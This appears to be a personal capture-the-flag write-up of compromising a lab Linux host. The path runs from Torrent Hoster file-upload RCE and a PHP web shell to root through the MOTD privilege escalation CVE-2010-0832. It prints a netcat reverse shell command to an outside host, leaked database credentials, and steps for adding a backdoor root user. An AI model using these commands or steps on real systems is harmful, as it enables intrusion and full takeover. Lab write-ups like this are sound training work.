Main steps
1. Enumerate site to find vulnerable web application
2. Locate public exploit to gain shell access
3. Enumerate user's home directory to find Linux MOTD file
4. Locate public exploit for MOTD
5. Gain root access

Learning points
1. Check ALL folders

`nmap`
![[Pasted image 20260316001039.png]]

Ports 22, 80 open

`Feroxbuster` returned 3 interesting directories: `/test`, `/rename`, and `/torrent`.

`/test` shows a PHP info page, with the PHP version info and some additional information: server is protected with the `Suhosin Patch 0.9.7`, and the program uses the `Zend Scripting Language Engine: Zend Engine v2.2.0`.
![[Pasted image 20260316001512.png]]

`/rename` shows a Renamer API syntax: `index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name`.
![[Pasted image 20260316001618.png]]

`/torrent` shows a web application named Torrent Hoster, with a login page.
![[Pasted image 20260316002245.png]]

Googling the Torrent Hoster application immediately gave me a POC for an unauthenticated RCE at https://github.com/Anon-Exploiter/exploits/blob/master/torrent_hoster_unauthenticated_rce.py.

Based on the code in the POC, it looks like there is a vulnerable file upload feature where a unauthenticated party can bypass the file type check by changing the MIME type of the file, then uploading a PHP file for RCE.

The script required some editing for syntax errors but I was able to get it to work and upload a PHP web shell into the website. Tried running the `id` command to test it and it was successful.
![[Pasted image 20260316003248.png]]

Was able to get a reverse shell using `nc -e /bin/bash 10.10.14.44 4444`.

`/etc/passwd` shows a user named `george`.
![[Pasted image 20260316003903.png]]

Checking the `config.php` file in the Torrent Hoster webroot shows some potential database credentials.
![[Pasted image 20260316004008.png]]

`torrent` : ` SuperSecret!! `

Was able to get access to the database using the password and escaping the exclamation marks, with `mysql -u torrent -pSuperSecret\!\!`.

Found a hashed password for user `Admin` in the database, `d5bfedcee289e5e05b86daad8ee3e2e2`.
![[Pasted image 20260316004334.png]]

Unfortunately, it seems like the hash cannot be cracked with `hashcat`.

Checked `george`'s home folder, and for some reason `www-data` has read access on all the files inside. Was able to read the user flag from here.

Since I had access the to home folder, I checked every folder here, and found an interesting file in `.cache`- `motd.legal-displayed`, which is empty for now.
![[Pasted image 20260316010513.png]]

This does mean that the Linux MOTD is enabled for this system. Googling this file name returns a CVE-2010-0832 for Local Privilege Escalation by tampering with the MOTD file. There are 2 different exploits on ExploitDB relating to this CVE, https://www.exploit-db.com/exploits/14273 and https://www.exploit-db.com/exploits/14339, but the second one seems to be more complete. The script will set up SSH keys in the root directory to allow you to access root via SSH.

Tried running the first script and got an error message: `ln: creating symbolic link /.cache: Permission denied`. This might be due to the way the script gets the HOME directory variable - by directly calling `$HOME`. However, since we are `www-data`, we do not have a proper `$HOME` variable set - trying to echo this results in no output. The second script uses the `~` to call home which works.

Tried running the second script and it successfully took over ownership of `/etc/passwd` and `/etc/shadow`, and appended the root user `toor` with the password `toor` to `/etc/shadow`. I then tried to `su toor` with password `toor` and was able to get root access.
![[Pasted image 20260316012019.png]]

